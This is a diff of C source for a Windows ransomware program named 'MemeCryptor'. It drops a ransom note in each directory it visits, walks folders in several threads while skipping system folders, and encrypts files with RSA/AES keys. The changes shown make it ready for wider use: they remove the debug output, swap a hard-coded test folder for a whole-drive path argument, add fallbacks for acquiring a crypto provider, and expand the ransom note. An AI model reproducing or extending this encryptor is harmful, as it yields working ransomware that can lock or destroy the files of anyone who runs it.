@@ -1,6 +1,6 @@
 #include "Threading.h"
 THREAD_STRUCT threadStruct;
-LPCSTR ransomNoteContent = "YEET U BEEN PWNED, SON!\n\n";
+LPCSTR ransomNoteContent = "YA YEET!!\n\nYou have officially been memed by MemeCryptor Ransomware!\n\nAll your files are now encrypted and embedded inside an image format.\nIf you try to use any recovery software outhere, the files can potentially be damaged and unretrievable...\n\nJust kidding! I have included my decrypting software on the github repo,\nso you can download and decrypt your stuff!!\n\n---------------------------------------------------------\n\nFeel free to contact me on Twitter @cPeterr to provide any feedback!\n\nThanks,\nPeter\n";
 int checkDirName(LPSTR directoryName) {
 	LPCSTR dirNameExcludeArray[16] = { "AppData", "tmp", "winnt", "temp", "thumb", "$Recycle.Bin", "$RECYCLE.BIN", "System Volume Information", "Boot", "Windows", "$WINDOWS.~BT", "Windows.old", "PerfLog", "Microsoft" };
 	for (int i = 0; i < 16; i++) {
@@ -50,7 +50,6 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 	hSearchHandle = FindFirstFileA(directoryName, &findFileData);
 
 	if (hSearchHandle == INVALID_HANDLE_VALUE) {
-		printf("FindFirstFile %s fails. 0x%x\n", directoryName, GetLastError());
 		goto CLEANUP;
 	}
 	dropRansomNote(directoryName);
@@ -84,16 +83,13 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 						strcat(fileName, findFileData.cFileName);
 						strcat(fileName, "\\*");
 						EnterCriticalSection(&pThreadStruct->threadCriticalSection);
-						if (addNode(pThreadStruct, fileName) == -1) {
-							printf("Add node for %s fails.\n", fileName);
-						}
+						addNode(pThreadStruct, fileName);
 						LeaveCriticalSection(&pThreadStruct->threadCriticalSection);
 					}
 					else {
 						if (checkFileName(findFileData.cFileName) == -1) {
 							continue;
 						}
-
 
 						LPSTR fileName = (LPSTR)calloc(strlen(directoryName) + strlen(findFileData.cFileName) + 1, 1);
 						if (!fileName) {
@@ -131,11 +127,6 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 							free(nonce);
 							continue;
 						}
-
-						for (int i = 0; i < 8; i++) {
-							printf("0x%x ", nonce[i]);
-						}
-						printf("\n");
 						fileEncrypt(hCryptProv, publicKey, fileName, key, nonce);
 
 						free(fileName);
@@ -155,6 +146,22 @@ CLEANUP:
 	return returnValue;
 }
 
+int acquireContext(HCRYPTPROV* phCryptProv) {
+	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+		return 0;
+	}
+	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, 0xF0000008)) {
+		return 0;
+	}
+	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+		return 0;
+	}
+	if (CryptAcquireContextA(phCryptProv, 0, "Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)", PROV_RSA_AES, 0xF0000008)) {
+		return 0;
+	}
+	return -1;
+}
+
 // make sure cryptinit has been called already
 void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
 	DWORD currThreadID;
@@ -171,7 +178,7 @@ void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
 		}
 	}
 
-	if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, 0)) {
+	if (acquireContext(&hCryptProv) == -1) {
 		goto CLEANUP;
 	}
 
@@ -242,18 +249,17 @@ int initThreadStruct() {
 }
 
 
-void launchThreadEncrypt() { // C:\Users\DongChuong\Desktop\EncryptTest
+void launchThreadEncrypt(LPSTR drivePath) {
 
 	THREAD_STRUCT* pThreadStruct = &threadStruct;
-	LPSTR firstDir = (LPSTR)calloc(strlen("C:\\Users\\DongChuong\\Desktop\\EncryptTest\\*") + 1, 1);
+	LPSTR firstDir = (LPSTR)(calloc(strlen(drivePath) + 3, 1));
 	if (!firstDir) {
 		return;
 	}
-	strcpy(firstDir, "C:\\Users\\DongChuong\\Desktop\\EncryptTest\\*");
-
+	strcpy(firstDir, drivePath);
+	strcat(firstDir, "\\*\0");
 
 	addNode(pThreadStruct, firstDir);
-
 	for (int i = 0; i < pThreadStruct->threadCount; i++) {
 		pThreadStruct->threadArray[i] = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)threadEncrypt, pThreadStruct, 0, 0);
 		if (pThreadStruct->threadArray[i] == 0 || pThreadStruct->threadArray[i] == INVALID_HANDLE_VALUE) {
@@ -301,7 +307,6 @@ int addNode(THREAD_STRUCT* pThreadStruct, LPSTR name) {
 
 	LL_NODE* node = newNode();
 	if (!node) {
-		printf("Can't add node");
 		return -1;
 	}
 	if (pThreadStruct->head == NULL) {
